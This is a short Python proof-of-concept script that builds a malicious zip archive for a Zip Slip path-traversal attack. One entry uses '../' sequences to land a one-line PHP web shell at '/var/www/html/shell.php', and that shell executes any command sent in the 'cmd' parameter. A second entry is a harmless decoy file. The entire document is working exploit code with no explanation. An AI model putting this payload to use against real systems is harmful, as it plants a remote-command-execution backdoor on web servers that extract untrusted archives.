#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../var/www/html/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
    z.writestr('otherfile.xml', 'Content of the file')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close() 

create_zip()
